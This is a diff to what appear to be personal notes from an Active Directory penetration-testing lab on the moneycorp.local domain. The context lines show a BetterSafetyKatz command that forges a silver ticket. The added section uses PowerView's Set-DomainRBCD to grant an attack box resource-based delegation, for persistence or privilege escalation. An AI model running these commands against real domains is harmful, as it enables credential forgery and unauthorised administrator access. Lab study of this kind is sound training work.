@@ -159,3 +159,17 @@ and with that we can create a silver ticket for the services (in this case HOST)
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21- 719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:1698fafb9170e4798e43b77ac38cf0bf /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 ```
 
+
+
+### **Set delegation for your attack box**
+==Generic write on the target machine needed==
+Now as persistence move(can also be a privesc btw) we can permit the delegation to dcorp-mgmt from our attack box to gain access as administrator on the machine on request
+Using powerview
+```powerview
+Set-DomainRBCD -Identity <TARGET> -DelegateFrom '<ATTACK BOX>$' -Verbose
+```
+Check if is setted
+```powerview
+Get-DomainRBCD
+```
+Now from your attack box (or whatever machine you configured)you can abuse the delegation
